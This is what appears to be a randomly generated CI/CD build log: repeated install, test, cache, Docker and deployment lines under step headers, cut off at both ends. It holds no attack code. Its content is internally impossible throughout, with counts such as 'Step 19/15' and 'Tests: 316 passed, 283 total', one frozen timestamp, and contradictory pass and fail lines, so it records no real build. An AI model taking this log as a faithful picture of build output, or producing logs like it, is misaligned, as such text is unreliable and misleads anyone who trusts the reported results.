build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache invalidated: dependencies\n[12:20:08] DEBUG: Connection pool: 6 active\nConnecting to cloud.services:443...\nStep 2/20: Testing\nCompiling components/handler.rs...\nTransforming 462 files...\nAlready up to date.\nInstalling webpack@1.10.4\nCache hit for key-6132\nChecking out main branch\nCompiling src/main.py...\nSuccess!\nTime: 15.263s\nWARNING: react has known vulnerabilities\n[12:20:08] WARN: Deprecated API usage\nCompleted.\nTransforming 848 files...\nnpm notice: package.json updated\nPOST /data - 202 (416ms)\nDone.\nArtifact downloaded: 46MB\nStep 19/15: Testing\nPOST /api - 202 (367ms)\n[12:20:08] INFO: Request completed\nTime: 104.747s\npip: Downloading eslint-1.1.tar.gz\nStep 11/15: Testing\nOK\nCoverage: 84% statements, 73% branches\nFetching submodules...\n[12:20:08] DEBUG: Loading configuration\nSuccess!\n\u2713 Step 'setup' succeeded\nHEAD is now at 5e911b5\nnpm install: added 299 packages\nEnvironment: staging\nTLS handshake completed\nChecking out develop branch\n[12:20:08] DEBUG: Query executed in 12ms\n[12:20:08] INFO: Starting build process\nSuccess!\nUsing Node.js 20.20.10\nCompleted.\nStep 8/24: Building\n[12:20:08] DEBUG: Initializing service\n\u2713 Task completed in 4847ms\nCache invalidated: node_modules\npip: Installing build dependencies...\nnpm install: resolved 1139 packages\nPlatform: darwin-arm64\nCreating production build...\nSnapshots: 23 passed, 44 total\nFAILED: test_api_health\nWARNING: react has known vulnerabilities\nGenerating source maps...\nWARNING: lodash has known vulnerabilities\nnpm install: resolved 1371 packages\nArtifact uploaded: build.tar.gz (47MB)\nLoading...\nPOST /data - 200 (22ms)\nStep 8/24: Testing\nHEAD is now at 9eea3bb\n  PASS: test_cache_hit (263ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPushing to registry...\nRan 166 tests in 9s\nPulling image: alpine:18\nCache miss for key-6050\n\u2713 All checks passed\n[12:20:08] DEBUG: Initializing service\nConnecting to acme.corp:443...\nCache invalidated: build\nGET /health - 204 (46ms)\nCache invalidated: node_modules\nDone.\nLoading...\nCoverage: 83% statements, 97% branches\nBuilding Docker image...\nTransforming 138 files...\n\u2713 Task completed in 3215ms\nReady.\n[12:20:08] DEBUG: Memory usage: 266MB\nCache miss for key-2247\n  PASS: unit/test_api_health.spec.js\nPOST /upload - 202 (363ms)\nWaiting...\nUploading artifact 'build' (14 files)\n\u2713 Step 'install' succeeded\nCreating production build...\nTLS handshake completed\npip: Collecting jest\nArtifact uploaded: build.tar.gz (12MB)\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 9/20: Deploying\nStep 2/25: Linting\nTime: 74.457s\nTransforming 564 files...\nCache hit for key-6195\nCache hit for key-6934\n[12:20:08] DEBUG: Loading configuration\nChecking out main branch\nPulling image: node:18\nNODE_ENV=development\nyarn add: Done in 23.69s\nConnection established\npip: Installing build dependencies...\nConnecting to example.com:443...\nCache invalidated: node_modules\nUploading artifact 'coverage' (43 files)\nGenerating source maps...\n[12:20:08] INFO: Request completed\nPOST /data - 202 (345ms)\nTransforming 114 files...\nMinifying main.js\nGET /api - 201 (83ms)\n[12:20:08] DEBUG: Memory usage: 137MB\nVerifying...\nConnecting to startup.dev:443...\n[12:20:08] DEBUG: Query executed in 58ms\nGenerating source maps...\nOptimizing 74 modules...\nCoverage: 73% statements, 61% branches\nWaiting...\nDone.\nCreating production build...\nLayer 2/8: ENV command\n  PASS: e2e/test_user_create.spec.js\nyarn add: Done in 7.97s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nyarn add: Done in 6.95s\nHEAD is now at 85f84e4\nCompiling lib/app.ts...\nCache restored successfully (285MB)\nyarn add: Done in 15.91s\n[12:20:08] DEBUG: Initializing service\nTransforming 559 files...\nSuccess!\nnpm install: resolved 1490 packages\n[12:20:08] INFO: Request completed\nArtifact uploaded: build.tar.gz (6MB)\nPulling image: python:18\n[12:20:08] INFO: Request completed\nCompleted.\n\u2713 Step 'test' succeeded\nImage pulled successfully\nCache saved successfully\nArtifact uploaded: dist.zip (48MB)\n[12:20:08] DEBUG: Initializing service\nStep 18/17: Building\nVerifying...\n[12:20:08] WARN: Deprecated API usage\nLoading...\nUploading artifact 'dist' (30 files)\n\u2713 Step 'checkout' succeeded\n  PASS: unit/test_db_connect.spec.js\nRan 20 tests in 46s\n[12:20:08] INFO: Starting build process\n[12:20:08] WARN: Deprecated API usage\nStep 15/23: Building\n[12:20:08] INFO: Connecting to database\nCache invalidated: dependencies\nStep 16/24: Deploying\nCreating production build...\n[12:20:08] WARN: Deprecated API usage\n  PASS: integration/test_auth_login.spec.js\nAlready up to date.\nTLS handshake completed\nSwitched to branch 'bugfix/task-580'\nProcessing...\nArtifact downloaded: 10MB\nMinifying app.js\nPushing to registry...\n[12:20:08] INFO: Cache refreshed\nHEAD is now at bb878de\n=== Step install_dependencies completed ===\n=== Step: upload_artifacts ===\npip: Installing build dependencies...\nAlready up to date.\n[12:20:08] INFO: Processing request\nOptimizing 59 modules...\nFinished.\nCache hit for key-7653\nUsing Python 3.11\nTransforming 770 files...\npip install: Successfully installed jest-3.11\n\u2713 Task completed in 2978ms\n  PASS: e2e/test_cache_hit.spec.js\nSwitched to branch 'hotfix/task-674'\n\u2717 build failed with exit code 14\nTime: 25.555s\npip: Downloading prettier-4.2.tar.gz\nEnvironment: test\npip: Installing build dependencies...\nWARNING: jest has known vulnerabilities\nRan 141 tests in 52s\nFAILED: test_cache_hit\nCache invalidated: node_modules\nStep 7/19: Deploying\nStep 11/24: Linting\nMinifying main.js\n\u2713 All checks passed\nCompleted.\n\u2713 package completed\nFinished.\nConnection established\n[12:20:08] INFO: Processing request\nCache miss for key-9041\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompleted.\nUsing Node.js 17.4.4\npip install: Successfully installed webpack-5.15\nCache miss for key-4942\nDone.\nnpm install: added 388 packages\nSwitched to branch 'hotfix/task-823'\n  PASS: test_api_health (312ms)\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:20:08] WARN: Deprecated API usage\nVerifying...\nEnvironment: production\n[12:20:08] INFO: Connecting to database\nnpm notice: package.json updated\nCache saved successfully\nnpm install: added 73 packages\nFAILED: test_auth_login\nStep 13/22: Installing dependencies\nUploading artifact 'dist' (13 files)\nCompiling utils/handler.rs...\nPushing to registry...\nCache saved successfully\npip: Installing build dependencies...\nStep 12/18: Building\nWaiting...\n\u2713 Task completed in 1152ms\nTLS handshake completed\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: added 62 packages\nHEAD is now at bb78846\n[12:20:08] INFO: Connecting to database\nConnecting to acme.corp:443...\npip: Downloading express-4.15.tar.gz\n[12:20:08] DEBUG: Initializing service\nTests: 454 passed, 471 total\nException: RuntimeError\nRan 127 tests in 29s\nAlready up to date.\nReady.\nStep 5/19: Deploying\nBundling vendor.js\nImage pulled successfully\nTLS handshake completed\nPlatform: linux-x64\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBuilding Docker image...\nPushing to registry...\nFAILED: test_api_health\n[12:20:08] WARN: Deprecated API usage\nnpm install: resolved 1846 packages\n[12:20:08] DEBUG: Memory usage: 1406MB\nInstalling axios@2.10.7\nLoading...\nOK\nTest Suites: 34 passed, 29 total\nFetching submodules...\nMinifying main.js\nCache restored successfully (283MB)\n[12:20:08] DEBUG: Initializing service\nBuilding Docker image...\nFinished.\nReady.\n\u2717 build failed with exit code 121\nyarn add: Done in 20.81s\n\u2713 Task completed in 1864ms\nStep 11/17: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCreating production build...\nSnapshots: 7 passed, 47 total\npip install: Successfully installed jest-2.10\nArtifact downloaded: 18MB\nDone.\nCompiling utils/service.java...\nSuccess!\npip install: Successfully installed react-4.3\nTime: 98.64s\nCache restored successfully (52MB)\nConnecting to test.io:443...\nPlatform: win32-x64\nFAILED: test_cache_hit\nFAILED: test_cache_hit\nCompiling src/main.py...\nStep 7/23: Testing\n  PASS: e2e/test_api_health.spec.js\nReady.\n\u2713 All checks passed\n[12:20:08] DEBUG: Query executed in 39ms\nCompiling lib/app.ts...\n[12:20:08] DEBUG: Memory usage: 1136MB\n[12:20:08] INFO: Connecting to database\npip: Installing build dependencies...\nTime: 41.629s\nTLS handshake completed\nCompiling utils/main.py...\n[12:20:08] DEBUG: Loading configuration\nCompleted.\n[12:20:08] WARN: Deprecated API usage\n[12:20:08] WARN: Deprecated API usage\npip: Collecting eslint\n[12:20:08] DEBUG: Initializing service\nCompiling lib/index.js...\n  PASS: unit/test_api_health.spec.js\nEnvironment: production\nPlatform: darwin-arm64\nException: NullPointerException\nTime: 44.478s\nException: ValueError\nWaiting...\nException: ValueError\nSwitched to branch 'hotfix/task-101'\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 2/23: Deploying\nStep 3/25: Linting\npip: Installing build dependencies...\nPushing to registry...\n  PASS: integration/test_user_create.spec.js\nnpm install: added 185 packages\nArtifact uploaded: dist.zip (69MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: dist.zip (93MB)\nConnecting to acme.corp:443...\n[12:20:08] ERROR: Connection failed\nTransforming 412 files...\npip: Collecting axios\nWARNING: webpack has known vulnerabilities\nCache miss for key-1467\n\u2713 Task completed in 1117ms\nnpm notice: package.json updated\nCompiling utils/app.ts...\nException: TypeError\nInstalling eslint@3.5.2\n[12:20:08] INFO: Connecting to database\nnpm notice: package.json updated\npip: Downloading express-2.1.tar.gz\nDone.\nWARNING: eslint has known vulnerabilities\nLayer 3/12: COPY command\n[12:20:08] INFO: Cache refreshed\nConnection established\n[12:20:08] WARN: Deprecated API usage\nException: RuntimeError\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUploading artifact 'dist' (28 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:20:08] DEBUG: Loading configuration\n[12:20:08] DEBUG: Initializing service\n\u2713 Step 'build' succeeded\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUploading artifact 'build' (12 files)\nnpm install: resolved 1314 packages\nUploading artifact 'dist' (25 files)\nCache invalidated: build\nTests: 316 passed, 283 total\nProcessing...\n[12:20:08] INFO: Connecting to database\nPOST /upload - 201 (250ms)\nSnapshots: 5 passed, 22 total\n[12:20:08] DEBUG: Initializing service\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Downloading webpack-1.16.tar.gz\n\u2713 lint completed\nCompiling utils/app.ts...\nCache hit for key-7166\n[12:20:08] DEBUG: Loading configuration\nOptimizing 98 modules...\nTests: 314 passed, 103 total\n=== Step upload_artifacts completed ===\n=== Step: save_cache ===\nCache restored successfully (466MB)\nCompiling src/service.java...\nTests: 274 passed, 120 total\nArtifact downloaded: 10MB\npip: Installing build dependencies...\nCache invalidated: build\nCache hit for key-6145\nCompiling lib/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPlatform: win32-x64\n[12:20:08] DEBUG: Loading configuration\nTime: 119.635s\nCache restored successfully (226MB)\nCache saved successfully\n[12:20:08] WARN: Deprecated API usage\nPlatform: darwin-arm64\nCompiling src/index.js...\nnpm notice: package.json updated\nProcessing...\n  PASS: test_db_connect (274ms)\nMinifying vendor.js\nCache miss for key-9798\nProcessing...\nArtifact uploaded: dist.zip (27MB)\n[12:20:08] WARN: Deprecated API usage\n\u2713 package completed\nInstalling webpack@4.4.9\nConnection established\nAlready up to date.\nyarn add: Done in 21.0s\nStep 19/15: Testing\n  PASS: test_user_create (117ms)\nPlatform: darwin-arm64\nWaiting...\nFAILED: test_db_connect\nSuccess!\nCompleted.\nUsing Node.js 14.3.5\nInstalling eslint@3.4.4\nPlatform: darwin-arm64\nBundling vendor.js\n[12:20:08] DEBUG: Initializing service\nTests: 72 passed, 469 total\nnpm install: added 491 packages\nReady.\nnpm install: added 150 packages\nSwitched to branch 'hotfix/task-436'\nnpm notice: created a lockfile\nRan 165 tests in 24s\nOK\nCache miss for key-8819\nException: ValueError\nBuilding Docker image...\nFinished.\n\u2713 Task completed in 4540ms\nNODE_ENV=production\n[12:20:08] DEBUG: Loading configuration\nFinished.\nGenerating source maps...\nArtifact uploaded: dist.zip (68MB)\nTests: 307 passed, 347 total\nArtifact uploaded: build.tar.gz (8MB)\nOptimizing 98 modules...\n[12:20:08] INFO: Processing request\nPlatform: darwin-arm64\n[12:20:08] DEBUG: Initializing service\nFetching submodules...\nyarn add: Done in 2.4s\npip: Downloading lodash-2.9.tar.gz\nnpm notice: created a lockfile\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: prettier has known vulnerabilities\n[12:20:08] DEBUG: Connection pool: 9 active\nWARNING: react has known vulnerabilities\nWaiting...\nWaiting...\nPlatform: darwin-arm64\nTLS handshake completed\nRan 29 tests in 52s\n[12:20:08] INFO: Processing request\n[12:20:08] ERROR: Connection failed\nStep 4/25: Installing dependencies\nRan 42 tests in 14s\nCompiling lib/handler.rs...\nGET /health - 200 (17ms)\nDone.\nVerifying...\nTransforming 580 files...\nnpm notice: created a lockfile\nEnvironment: production\npip: Installing build dependencies...\nPOST /upload - 200 (447ms)\nyarn add: Done in 20.69s\nnpm notice: created a lockfile\n[12:20:08] ERROR: Connection failed\nImage pulled successfully\npip install: Successfully installed prettier-2.2\n  PASS: e2e/test_user_create.spec.js\nStep 16/19: Building\nyarn add: Done in 9.75s\nStep 13/16: Building\nLoading...\nSnapshots: 25 passed, 42 total\n[12:20:08] WARN: Deprecated API usage\nSwitched to branch 'hotfix/task-988'\nnpm install: added 169 packages\nCompiling lib/app.ts...\npip: Downloading prettier-5.13.tar.gz\n\u2717 build failed with exit code 113\nnpm install: resolved 220 packages\nGET /health - 201 (66ms)\nFinished.\n\u2713 All checks passed\nOK\n[12:20:08] WARN: Deprecated API usage\n  PASS: unit/test_api_health.spec.js\nUploading artifact 'coverage' (15 files)\nConnecting to example.com:443...\nCache miss for key-6843\nCompleted.\n[12:20:08] DEBUG: Query executed in 50ms\nSnapshots: 10 passed, 40 total\nStep 10/20: Deploying\nnpm install: resolved 945 packages\nReady.\nSnapshots: 42 passed, 43 total\nFAILED: test_auth_login\nPulling image: alpine:18\nTest Suites: 12 passed, 19 total\nArtifact uploaded: build.tar.gz (36MB)\nFinished.\nCompiling src/service.java...\nDone.\n  PASS: e2e/test_user_create.spec.js\nConnecting to example.com:443...\nGET /api - 201 (1ms)\n[12:20:08] INFO: Processing request\n[12:20:08] DEBUG: Connection pool: 4 active\nDone.\nUsing Node.js 18.4.6\nCompiling lib/service.java...\nVerifying...\nFetching submodules...\nTests: 275 passed, 63 total\nVerifying...\nCreating production build...\nOK\nSwitched to branch 'feature/task-217'\npip: Downloading express-3.13.tar.gz\n[12:20:08] DEBUG: Initializing service\nSnapshots: 3 passed, 12 total\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: webpack has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 15/20: Installing dependencies\nSnapshots: 18 passed, 38 total\nUsing Node.js 14.8.5\nHEAD is now at 48e3b63\nnpm install: resolved 1878 packages\nCache saved successfully\nMinifying vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nNODE_ENV=test\nPOST /data - 202 (92ms)\nCompiling utils/service.java...\nLoading...\npip: Collecting prettier\nCompleted.\nTransforming 997 files...\nCache saved successfully\n[12:20:08] WARN: Deprecated API usage\nCache invalidated: build\nPushing to registry...\nException: TypeError\nTime: 106.391s\nWaiting...\npip: Collecting lodash\nBundling runtime.css\nConnection established\nHEAD is now at db1dd76\nFinished.\n[12:20:08] DEBUG: Connection pool: 7 active\nCache miss for key-7043\n[12:20:08] DEBUG: Memory usage: 563MB\nStep 17/19: Linting\nLayer 1/15: COPY command\nRan 65 tests in 45s\nTime: 89.494s\nImage pulled successfully\nUsing Node.js 20.17.3\nCache miss for key-6586\nMinifying vendor.js\nOK\nEnvironment: development\nCreating production build...\nGET /api - 200 (67ms)\n[12:20:08] INFO: Cache refreshed\nSwitched to branch 'feature/task-740'\n[12:20:08] INFO: Connecting to database\n[12:20:08] INFO: Cache refreshed\nBundling styles.css\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n=== Step save_cache completed ===\n=== Step: unit_tests ===\n[12:20:08] INFO: Connecting to database\nCache restored successfully (71MB)\nBuilding Docker image...\nGenerating source maps...\n  PASS: e2e/test_api_health.spec.js\n[12:20:08] DEBUG: Query executed in 47ms\nArtifact downloaded: 30MB\nCache invalidated: dependencies\nWARNING: jest has known vulnerabilities\npip install: Successfully installed axios-5.7\nConnection established\nImage pulled successfully\nCreating production build...\nUploading artifact 'build' (9 files)\nBuilding Docker image...\nStep 8/24: Testing\nWARNING: axios has known vulnerabilities\nProcessing...\nTransforming 116 files...\n[12:20:08] WARN: Deprecated API usage\n\u2713 Step 'setup' succeeded\n[12:20:08] INFO: Processing request\n[12:20:08] DEBUG: Connection pool: 18 active\nEnvironment: staging\nUsing Python 3.12\n[12:20:08] DEBUG: Loading configuration\nCompiling lib/index.js...\nStep 3/23: Building\nCache saved successfully\nOK\nCompleted.\n[12:20:08] INFO: Starting build process\nLoading...\nConnection established\nStep 11/17: Linting\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGenerating source maps...\nSwitched to branch 'hotfix/task-660'\n[12:20:08] DEBUG: Initializing service\npip: Downloading jest-3.0.tar.gz\nConnection established\nCache restored successfully (423MB)\nArtifact downloaded: 17MB\nArtifact uploaded: dist.zip (85MB)\npip install: Successfully installed lodash-3.12\nException: NullPointerException\nProcessing...\nCache invalidated: build\nArtifact downloaded: 30MB\nSwitched to branch 'bugfix/task-281'\nStep 19/24: Linting\n\u2713 All checks passed\n[12:20:08] DEBUG: Initializing service\nCompiling utils/utils.go...\n\u2717 build failed with exit code 71\nBuilding Docker image...\nInstalling axios@1.7.8\npip: Collecting jest\n[12:20:08] DEBUG: Loading configuration\n\u2713 All checks passed\n[12:20:08] INFO: Processing request\nUploading artifact 'coverage' (17 files)\n[12:20:08] DEBUG: Memory usage: 1247MB\n[12:20:08] INFO: Processing request\nProcessing...\nVerifying...\nFAILED: test_api_health\nGenerating source maps...\n[12:20:08] INFO: Starting build process\n  PASS: e2e/test_cache_hit.spec.js\n\u2713 package completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2717 build failed with exit code 72\npip: Collecting jest\nWARNING: eslint has known vulnerabilities\npip: Collecting axios\n[12:20:08] DEBUG: Memory usage: 1395MB\n\u2717 build failed with exit code 46\nCreating production build...\nProcessing...\nReady.\npip: Installing build dependencies...\n[12:20:08] DEBUG: Loading configuration\npip: Collecting express\n[12:20:08] INFO: Processing request\nMinifying app.js\nStep 5/24: Building\nSuccess!\nPlatform: win32-x64\n  PASS: test_user_create (395ms)\nFetching submodules...\nProcessing...\n  PASS: integration/test_api_health.spec.js\nBundling vendor.js\nException: RuntimeError\nGET /health - 200 (82ms)\nCache miss for key-1020\n[12:20:08] INFO: Connecting to database\n  PASS: test_db_connect (4ms)\nnpm notice: created a lockfile\nStep 8/23: Running migrations\nStep 20/20: Deploying\nSuccess!\n[12:20:08] DEBUG: Memory usage: 1585MB\npip install: Successfully installed prettier-1.20\nUsing Python 3.9\nWARNING: axios has known vulnerabilities\n[12:20:08] DEBUG: Initializing service\n[12:20:08] DEBUG: Initializing service\nnpm install: added 187 packages\nConnection established\npip: Downloading prettier-3.4.tar.gz\nInstalling prettier@1.6.1\nnpm notice: created a lockfile\nUploading artifact 'build' (23 files)\nnpm install: resolved 324 packages\nArtifact downloaded: 30MB\nBundling vendor.css\nStep 1/20: Linting\nSnapshots: 26 passed, 40 total\npip: Collecting eslint\n[12:20:08] INFO: Cache refreshed\nCompiling src/service.java...\nCompiling lib/service.java...\nSnapshots: 23 passed, 38 total\nNODE_ENV=test\nWARNING: express has known vulnerabilities\n\u2713 Task completed in 2264ms\nTest Suites: 43 passed, 7 total\nCompiling src/main.py...\nBundling styles.js\nnpm notice: created a lockfile\nCoverage: 84% statements, 95% branches\n[12:20:08] DEBUG: Connection pool: 1 active\nBuilding Docker image...\n[12:20:08] INFO: Cache refreshed\nCache restored successfully (489MB)\nPulling image: alpine:latest\nStep 2/20: Building\nSnapshots: 9 passed, 16 total\nCompiling lib/utils.go...\nStep 12/18: Testing\nBuilding Docker image...\nProcessing...\nUsing Python 3.11\nPlatform: linux-x64\nnpm install: resolved 430 packages\nPOST /data - 200 (309ms)\nHEAD is now at 8f1828f\nStep 17/16: Deploying\nVerifying...\nTests: 339 passed, 347 total\nTime: 75.796s\nMinifying vendor.js\n[12:20:08] ERROR: Connection failed\nNODE_ENV=production\n  PASS: test_api_health (25ms)\nnpm notice: package.json updated\nTest Suites: 39 passed, 8 total\nWARNING: axios has known vulnerabilities\n\u2713 Step 'setup' succeeded\nWARNING: webpack has known vulnerabilities\nOK\nArtifact uploaded: build.tar.gz (35MB)\nPlatform: darwin-arm64\npip: Downloading webpack-1.17.tar.gz\nChecking out develop branch\n\u2717 build failed with exit code 110\nCompiling src/app.ts...\n[12:20:08] INFO: Processing request\nStep 10/22: Testing\nWaiting...\nCoverage: 98% statements, 89% branches\nCreating production build...\nWARNING: jest has known vulnerabilities\nCache saved successfully\nHEAD is now at b0b8c71\nStep 5/17: Testing\nReady.\n\u2713 Step 'build' succeeded\nOK\nGenerating source maps...\nOK\nTLS handshake completed\nTime: 61.868s\nArtifact uploaded: dist.zip (95MB)\nCompiling lib/app.ts...\nLoading...\nTLS handshake completed\nArtifact uploaded: dist.zip (44MB)\nStep 19/17: Linting\nDone.\nSnapshots: 16 passed, 3 total\nRan 97 tests in 28s\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nNODE_ENV=production\npip install: Successfully installed webpack-1.18\nOK\nCache saved successfully\npip: Downloading eslint-4.9.tar.gz\nOptimizing 87 modules...\nOK\n=== Step unit_tests completed ===\n=== Step: type_check ===\nCache restored successfully (116MB)\nWaiting...\nSuccess!\n[12:20:08] INFO: Cache refreshed\nReady.\nOK\n  PASS: unit/test_api_health.spec.js\nUploading artifact 'dist' (21 files)\nVerifying...\nUploading artifact 'coverage' (38 files)\n[12:20:08] WARN: Deprecated API usage\nTLS handshake completed\n[12:20:08] INFO: Connecting to database\nCache miss for key-8733\nMinifying app.js\nTime: 114.249s\nConnecting to cloud.services:443...\nTest Suites: 12 passed, 41 total\n[12:20:08] INFO: Connecting to database\nImage pulled successfully\npip: Installing build dependencies...\nArtifact uploaded: dist.zip (42MB)\n\u2713 Step 'test' succeeded\n[12:20:08] INFO: Cache refreshed\nGET /api - 204 (60ms)\nImage pulled successfully\nCoverage: 91% statements, 69% branches\npip: Installing build dependencies...\nCache saved successfully\n[12:20:08] ERROR: Connection failed\nCache invalidated: build\nMinifying vendor.js\nOptimizing 89 modules...\n  PASS: test_auth_login (149ms)\n[12:20:08] INFO: Cache refreshed\nOK\nCache hit for key-3109\nSwitched to branch 'hotfix/task-831'\nBuilding Docker image...\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:20:08] DEBUG: Loading configuration\n[12:20:08] INFO: Connecting to database\nUploading artifact 'dist' (7 files)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nDone.\nStep 19/20: Running migrations\nArtifact downloaded: 45MB\nTLS handshake completed\n[12:20:08] ERROR: Connection failed\n\u2713 Task completed in 208ms\n[12:20:08] DEBUG: Query executed in 2ms\nMinifying main.js\nInstalling express@2.20.2\nTransforming 791 files...\nCompiling lib/service.java...\nStep 9/19: Deploying\nSuccess!\nReady.\nUploading artifact 'dist' (50 files)\npip: Installing build dependencies...\nUploading artifact 'build' (21 files)\nOK\nGenerating source maps...\n  PASS: test_cache_hit (327ms)\nFAILED: test_auth_login\nSnapshots: 49 passed, 11 total\nArtifact uploaded: dist.zip (69MB)\n  PASS: e2e/test_user_create.spec.js\nGenerating source maps...\n[12:20:08] DEBUG: Loading configuration\nTime: 54.705s\nyarn add: Done in 7.82s\npip: Installing build dependencies...\n[12:20:08] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOK\nLoading...\npip: Downloading react-5.1.tar.gz\nStep 6/16: Running migrations\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: axios has known vulnerabilities\nWARNING: express has known vulnerabilities\n[12:20:08] INFO: Processing request\n[12:20:08] INFO: Connecting to database\nTests: 387 passed, 249 total\nConnecting to startup.dev:443...\npip install: Successfully installed express-2.9\nVerifying...\nHEAD is now at 34a8e52\npip: Installing build dependencies...\nEnvironment: production\n[12:20:08] WARN: Deprecated API usage\nChecking out master branch\n[12:20:08] ERROR: Connection failed\n  PASS: test_db_connect (362ms)\nCache hit for key-7091\nException: TypeError\nnpm install: added 492 packages\n[12:20:08] INFO: Connecting to database\nConnection established\nPulling image: node:latest\npip: Installing build dependencies...\nConnecting to cloud.services:443...\nTime: 73.958s\n[12:20:08] DEBUG: Initializing service\nCache saved successfully\nArtifact downloaded: 37MB\nGET /api - 200 (98ms)\nPlatform: darwin-arm64\nWARNING: webpack has known vulnerabilities\n[12:20:08] INFO: Starting build process\n[12:20:08] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:20:08] ERROR: Connection failed\nPulling image: alpine:latest\nCompiling lib/main.py...\nWaiting...\n[12:20:08] INFO: Request completed\nLayer 5/11: RUN command\nGenerating source maps...\nRan 29 tests in 60s\nCache invalidated: build\n[12:20:08] INFO: Connecting to database\nImage pulled successfully\nCreating production build...\nStep 5/20: Running migrations\n\u2713 deploy completed\npip install: Successfully installed webpack-1.9\nCoverage: 71% statements, 81% branches\nWARNING: prettier has known vulnerabilities\nCache invalidated: node_modules\nCompiling src/index.js...\nUsing Python 3.12\nnpm install: resolved 815 packages\nVerifying...\nConnecting to example.com:443...\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:20:08] INFO: Processing request\nLayer 3/15: RUN command\nLoading...\nUploading artifact 'coverage' (14 files)\nUsing Node.js 14.6.4\n\u2713 Step 'setup' succeeded\n[12:20:08] INFO: Cache refreshed\nArtifact downloaded: 17MB\n[12:20:08] DEBUG: Query executed in 7ms\nUsing Python 3.12\npip install: Successfully installed react-2.7\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling eslint@4.16.8\n\u2717 build failed with exit code 7\nStep 12/15: Deploying\nTime: 119.489s\nArtifact uploaded: dist.zip (7MB)\nTransforming 717 files...\nBundling vendor.js\nRan 105 tests in 43s\nStep 15/17: Running migrations\nBundling styles.js\n[12:20:08] INFO: Request completed\nnpm install: added 138 packages\n[12:20:08] INFO: Processing request\nCompleted.\nDone.\nStep 5/18: Installing dependencies\n\u2713 Step 'checkout' succeeded\nWaiting...\nStep 20/21: Linting\n[12:20:08] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (62MB)\nStep 4/19: Deploying\nOK\nWARNING: eslint has known vulnerabilities\nStep 2/24: Installing dependencies\nChecking out develop branch\nCompiling utils/handler.rs...\nCache invalidated: build\nCache miss for key-3541\nNODE_ENV=production\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nMinifying main.js\n[12:20:08] DEBUG: Initializing service\nCompiling lib/index.js...\nStep 4/22: Linting\n[12:20:08] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nRan 133 tests in 32s\n\u2713 Step 'install' succeeded\nHEAD is now at 9eca579\npip: Downloading webpack-2.16.tar.gz\nFetching submodules...\nArtifact uploaded: dist.zip (46MB)\nArtifact uploaded: build.tar.gz (22MB)\nCache restored successfully (334MB)\nSuccess!\nCompiling src/main.py...\nDone.\n[12:20:08] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGET /api - 200 (51ms)\nCompiling components/index.js...\n=== Step type_check completed ===\n=== Step: deploy_staging ===\nCache saved successfully\npip install: Successfully installed express-3.2\n[12:20:08] WARN: Deprecated API usage\nUsing Python 3.11\nConnection established\nReady.\n[12:20:08] INFO: Processing request\nRan 86 tests in 15s\nCompiling components/main.py...\nInstalling jest@5.9.3\nCache hit for key-6219\n[12:20:08] DEBUG: Initializing service\nPOST /data - 201 (334ms)\nRan 198 tests in 46s\n[12:20:08] WARN: Deprecated API usage\nConnection established\nFetching submodules...\nPushing to registry...\nGenerating source maps...\nCreating production build...\nCompiling components/service.java...\n[12:20:08] DEBUG: Connection pool: 8 active\nStep 11/15: Testing\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 test completed\nCache miss for key-6468\nStep 16/20: Building\nCreating production build...\nEnvironment: test\npip: Collecting prettier\nAlready up to date.\nTime: 44.115s\nUsing Python 3.12\nTime: 81.884s\n[12:20:08] WARN: Deprecated API usage\n[12:20:08] DEBUG: Memory usage: 875MB\n\u2713 All checks passed\nTest Suites: 9 passed, 41 total\nNODE_ENV=production\npip: Collecting axios\nStep 5/24: Linting\nMinifying main.js\nStep 9/16: Deploying\n[12:20:08] DEBUG: Connection pool: 2 active\nMinifying vendor.js\nCompiling src/index.js...\nSwitched to branch 'bugfix/task-765'\nyarn add: Done in 8.42s\nException: RuntimeError\n[12:20:08] DEBUG: Connection pool: 15 active\n\u2713 Step 'setup' succeeded\n[12:20:08] DEBUG: Initializing service\nArtifact uploaded: dist.zip (3MB)\nImage pulled successfully\npip: Installing build dependencies...\nLayer 6/12: RUN command\nCompleted.\nOK\nConnecting to cloud.services:443...\nOptimizing 63 modules...\nArtifact 